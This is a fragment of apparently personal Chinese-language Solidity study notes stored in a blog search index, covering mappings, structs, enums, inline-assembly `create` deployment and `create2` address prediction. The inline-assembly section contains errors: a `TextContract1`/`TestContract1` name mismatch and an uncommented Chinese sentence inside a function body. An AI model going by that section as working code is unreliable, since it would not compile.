class="comment">//增加地址到数组，从而实现遍历</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">getsize</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> keys.length;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">first</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> balances[keys[<span class="number">0</span>]];<span class="comment">//第一个地址的余额</span></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">last</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> balances[keys[keys.length<span class="number">-1</span>]];<span class="comment">//最后一个地址的余额</span></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">get</span><span class="params">(uint i)</span>external view <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> balances[keys[i]];<span class="comment">//任意一个地址的余额</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="结构体的定义方法与数组组合"><a href="#结构体的定义方法与数组组合" class="headerlink" title="结构体的定义方法与数组组合"></a>结构体的定义方法与数组组合</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">contract Struct&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Car</span>&#123;</span></span><br><span class="line">        <span class="built_in">string</span> model;</span><br><span class="line">        uint year;</span><br><span class="line">        address owner;</span><br><span class="line">    &#125;</span><br><span class="line">    Car public car;</span><br><span class="line">    Car[] public cars;<span class="comment">//可通过这里查看数组</span></span><br><span class="line">    mapping(address =&gt;Car[])public carsByOwner;</span><br><span class="line">    function <span class="title function_">examples</span><span class="params">()</span>external&#123;</span><br><span class="line">        Car memory toyota=Car(<span class="string">&quot;Toyota&quot;</span>,<span class="number">1990</span>,msg.sender);</span><br><span class="line">        Car memory lambo=Car(&#123;year:<span class="number">1980</span>,model:<span class="string">&quot;Lamborghini&quot;</span>,owner:msg.sender&#125;);<span class="comment">//顺序可换换</span></span><br><span class="line">        Car memory tesla;</span><br><span class="line">        tesla.model=<span class="string">&quot;Tesla&quot;</span>;</span><br><span class="line">        tesla.year=<span class="number">2010</span>;</span><br><span class="line">        tesla.owner=msg.sender;</span><br><span class="line">        cars.push(toyota);</span><br><span class="line">        cars.push(lambo);</span><br><span class="line">        cars.push(tesla);</span><br><span class="line">        cars.push(Car(<span class="string">&quot;Ferrari&quot;</span>,<span class="number">2020</span>,msg.sender));</span><br><span class="line">        Car storage _car=cars[<span class="number">0</span>];</span><br><span class="line">        _car.year=<span class="number">1999</span>;</span><br><span class="line">        delete _car.owner;</span><br><span class="line">        delete cars[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="枚举的用法"><a href="#枚举的用法" class="headerlink" title="枚举的用法"></a>枚举的用法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">contract Enum&#123;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">Status</span>&#123;</span></span><br><span class="line">        None,</span><br><span class="line">        Pending,</span><br><span class="line">        Shipped,</span><br><span class="line">        Completed,</span><br><span class="line">        Rejected,</span><br><span class="line">        Canceled</span><br><span class="line">    &#125;<span class="comment">//分别对应 0，1，2，3，4，5</span></span><br><span class="line">    Status public status;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Order</span>&#123;</span></span><br><span class="line">        address buyer;</span><br><span class="line">        Status status;</span><br><span class="line">    &#125;</span><br><span class="line">    Order[]public orders;</span><br><span class="line">    function <span class="title function_">get</span><span class="params">(Status _status)</span> external <span class="title function_">returns</span><span class="params">(Status)</span>&#123;<span class="comment">//输入枚举的序号，得到枚举的序号</span></span><br><span class="line">        status=_status;</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">ship</span><span class="params">()</span>external&#123;</span><br><span class="line">        status=Status.Shipped;<span class="comment">//调用后得到2；</span></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">reset</span><span class="params">()</span>external&#123;</span><br><span class="line">        delete status;<span class="comment">//删除，变成默认值0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="通过内联汇编部署合约-懵点"><a href="#通过内联汇编部署合约-懵点" class="headerlink" title="通过内联汇编部署合约(懵点)"></a>通过内联汇编部署合约(懵点)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">contract TextContract1&#123;</span><br><span class="line">    address public owner=msg.sender;</span><br><span class="line">    function <span class="title function_">setOwner</span><span class="params">(address _owner)</span>public&#123;</span><br><span class="line">        require(msg.sender==owner,<span class="string">&quot;not owner&quot;</span>);</span><br><span class="line">        owner=_owner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TestContract2&#123;</span><br><span class="line">    address public owner=msg.sender;</span><br><span class="line">    uint public value=msg.value;</span><br><span class="line">    uint public x;</span><br><span class="line">    uint public y;</span><br><span class="line">    constructor(uint _x,uint _y)&#123;</span><br><span class="line">        x=_x;</span><br><span class="line">        y=_y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//代理合约，用来部署合约1和2</span></span><br><span class="line">contract Proxy&#123;</span><br><span class="line">    event <span class="title function_">Deploy</span><span class="params">(address)</span>;</span><br><span class="line">    function <span class="title function_">deploy</span><span class="params">(bytes memory _code)</span>external payable <span class="title function_">returns</span><span class="params">(address addr)</span>&#123;<span class="comment">//隐式返回：returns后面定义了名称，自动返回</span></span><br><span class="line">        <span class="comment">//获得部署合约的地址</span></span><br><span class="line">        assembly&#123;<span class="comment">//内联汇编</span></span><br><span class="line">            <span class="comment">//create(v,p,n)</span></span><br><span class="line">            <span class="comment">//v代表部署合约发送的币的数量  通过callvalue获取</span></span><br><span class="line">            <span class="comment">//p代表内存中机器码开始的位置  通过add(_code,0x20)跳跃</span></span><br><span class="line">            <span class="comment">//n代表机器码内存的大小  通过mload(_code)获取</span></span><br><span class="line">            addr :=create(callvalue(),add(_code,<span class="number">0x20</span>),mload(_code))<span class="comment">//msg.value在这里不行</span></span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">        require(addr!=address(<span class="number">0</span>),<span class="string">&quot;deploy failed&quot;</span>); <span class="comment">//判断是否部署成功</span></span><br><span class="line">        emit <span class="title function_">Deploy</span><span class="params">(addr)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//通过date来呼叫另一个合约中的函数</span></span><br><span class="line">    function <span class="title function_">execute</span><span class="params">(address _target,bytes memory _date)</span>external payable&#123;</span><br><span class="line">        (<span class="type">bool</span> success, )=_target.call&#123;value:msg.value&#125;(_date);</span><br><span class="line">        require(success,<span class="string">&quot;failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//助手合约，用来得到合约1和2或者合约中函数的code</span></span><br><span class="line">contract Helper&#123;</span><br><span class="line">    <span class="comment">//获取呼叫合约1的代码</span></span><br><span class="line">    function <span class="title function_">getBytecode1</span><span class="params">()</span>external pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;</span><br><span class="line">        bytes memory bytecode=type(TestContract1).creationCode;<span class="comment">//特定方法type(合约名称).creationCode</span></span><br><span class="line">        <span class="keyword">return</span> bytecode;</span><br><span class="line">        没有构造函数时用此方法获得bytecode;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//获取呼叫合约2的代码</span></span><br><span class="line">    function <span class="title function_">getBytecode2</span><span class="params">(uint _x,uint _y)</span>external pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;</span><br><span class="line">        bytes memory bytecode=type(TestContract2).creationCode;<span class="comment">//特定方法</span></span><br><span class="line">        <span class="keyword">return</span> abi.encodePacked(bytecode,abi.encode(_x,_y)); <span class="comment">//通过将传入的参数与bytecode打包生成新的bytecode</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//获取呼叫合约1中setOwner的所需要的date</span></span><br><span class="line">    function <span class="title function_">getCalldate</span><span class="params">(address _owner)</span>external pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;<span class="comment">//_owner为传入合约1中函数的参数</span></span><br><span class="line">        <span class="keyword">return</span> abi.encodeWithSignature(<span class="string">&quot;setOwner(address)&quot;</span>,_owner);<span class="comment">//特定方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="用create2来构造函数（可提前预测生成的地址）"><a href="#用create2来构造函数（可提前预测生成的地址）" class="headerlink" title="用create2来构造函数（可提前预测生成的地址）"></a>用create2来构造函数（可提前预测生成的地址）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line">contract DeployWithCreate2&#123;</span><br><span class="line">  address public owner;</span><br><span class="line">  constructor(address _owner)&#123;</span><br><span class="line">    owner=_owner;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Create2Factory&#123;</span><br><span class="line">  event <span class="title function_">Deploy</span><span class="params">(address addr)</span>;</span><br><span class="line">  function <span class="title function_">deploy</span><span class="params">(uint _salt)</span>external&#123;</span><br><span class="line">    DeployWithCreate2 _contract=new DeployWithCreate2&#123;</span><br><span class="line">      salt:bytes32(_salt)</span><br><span class="line">    &#125;(msg.sender);<span class="comment">//create2方法相对于原来的方法只需加个大括号</span></span><br><span class="line">    emit <span class="title function_">Deploy</span><span class="params">(address(_contract))</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//计算合约地址的方法</span></span><br><span class="line">  function <span class="title function_">getAddress</span><span class="params">(bytes memory bytecode,uint _salt)</span>public view <span class="title function_">returns</span><span class="params">(address)</span></span><br><span class="line">  &#123;</span><br><span class="line">    bytes32 hash=keccak256(abi.encodePacked(</span><br><span class="line">      bytes1(<span class="number">0xff</span>),address(this),_salt,keccak256(bytecode)</span><br><span class="line">    ));</span><br><span class="line">    <span class="keyword">return</span> address(uint160(uint(hash)));</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//计算bytecode</span></span><br><span class="line">  function <span class="title function_">getBytecode</span><span class="params">(address _owner)</span>public pure <span class="title function_">returns</span><span class="params">(bytes memory)</span>&#123;</span><br><span class="line">    bytes memory bytecode=type(DeployWithCreate2).creationCode;</span><br><span class="line">    <span class="keyword">return</span> abi.encodePacked(bytecode,abi.encode(_owner));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -solidity学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
